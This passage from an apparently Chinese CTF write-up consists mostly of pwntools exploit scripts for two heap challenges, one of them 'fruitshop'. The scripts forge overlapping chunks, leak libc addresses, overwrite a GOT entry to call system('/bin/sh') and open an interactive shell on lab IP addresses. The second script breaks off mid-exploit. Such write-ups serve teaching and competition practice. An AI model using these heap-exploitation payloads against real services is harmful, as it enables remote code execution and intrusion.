</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>#delete three chunk</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;BBBB&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Delete</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;BBBB&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Delete</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>#heap overlap</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;BBBB&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Delete</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>#x/20wx 0x24150</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Show</span><span class=p>(),</span><span class=mh>0x30</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>free_got</span> <span class=o>=</span> <span class=mh>0x00023014</span>
</span></span><span class=line><span class=cl>	<span class=n>strlen_got</span> <span class=o>=</span> <span class=mh>0x00023034</span>
</span></span><span class=line><span class=cl>	<span class=n>strcmp_got</span> <span class=o>=</span> <span class=mh>0x0002300c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>strcmp_got</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Edit</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;free_offset: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;system_offset: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>#add 1 victim chunk</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;B&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Show</span><span class=p>(),</span><span class=mh>0x10</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># #add 2 target chunk</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;B&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Show</span><span class=p>(),</span><span class=mh>0x10</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># leak libc</span>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;C&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Show</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>libc_base</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;strcmp&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;libc_base: &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>next</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>binsh_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Edit</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>msg</span> <span class=o>=</span> <span class=s2>&#34;End&#34;</span>
</span></span><span class=line><span class=cl>	<span class=n>payload</span> <span class=o>=</span> <span class=n>fix</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>Show</span><span class=p>(),</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>md5_check</span>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Input code&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span><span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>pwn</span><span class=p>(</span><span class=s1>&#39;192.168.1.104&#39;</span><span class=p>,</span><span class=mi>8888</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=fruitshop>fruitshop</h3><p>uaf，直接house of pig一把梭。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>warnings</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>warnings</span><span class=o>.</span><span class=n>filterwarnings</span><span class=p>(</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># context.aslr = False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>fruit</span><span class=p>,</span> <span class=n>index</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(new):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>fruit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;index:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content:</span><span class=se>\n\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>fruit</span><span class=p>,</span> <span class=n>index</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(edit):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>fruit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content:</span><span class=se>\n\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit_Apple</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(edit):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;Apple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Do~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>[:</span><span class=mh>0x200</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Re~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>[</span><span class=mh>0x200</span><span class=p>:</span><span class=mh>0x200</span><span class=o>+</span><span class=mh>0xAB0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Mi~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>[</span><span class=mh>0x200</span><span class=o>+</span><span class=mh>0xAB0</span><span class=p>:</span><span class=mh>0x200</span><span class=o>+</span><span class=mh>0xAB0</span><span class=o>+</span><span class=mh>0x100</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Fa~</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>[</span><span class=mh>0x200</span><span class=o>+</span><span class=mh>0xAB0</span><span class=o>+</span><span class=mh>0x100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>fruit</span><span class=p>,</span> <span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(delete):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>fruit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>fruit</span><span class=p>,</span> <span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;&gt; </span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;(show):</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>fruit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;idx:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># r = process(&#34;./pwn&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;192.168.1.107&#34;</span><span class=p>,</span> <span class=s2>&#34;8888&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=s2>&#34;Durian&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>u64</span><span class=p>((</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;What do you want to do?&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=p>(</span><span class=mi>23</span> <span class=o>+</span> <span class=mh>0x110</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)])[</span><span class=o>-</span><span class=mi>8</span><span class=p>:])</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;heap: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=s2>&#34;Apple&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>u64</span><span class=p>((</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;What do you want to do?&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=p>(</span><span class=mi>23</span> <span class=o>+</span> <span class=mh>0xDD0</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)])[</span><span class=o>-</span><span class=mi>8</span><span class=p>:])</span> <span class=o>+</span> <span class=mh>0x15555531a000</span> <span class=o>-</span> <span class=mh>0x155555506be0</span>
</span></span><span class=line><span class=cl><span class=n>_IO_str_jumps</span> <span class=o>=</span> <span class=mh>0x155555503560</span> <span class=o>-</span> <span class=mh>0x15555531a000</span> <span class=o>+</span> <span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=n>_IO_list_all</span> <span class=o>=</span> <span class=n>libc</span> <span class=o>+</span> <span class=mh>0x1ed5a0</span>
</span></span><span class=line><span class=cl><span class=n>__free_hook</span> <span class=o>=</span> <span class=n>libc</span> <span class=o>+</span> <span class=mh>0x1eee48</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=s2>&#34;Cherry&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;Banana&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
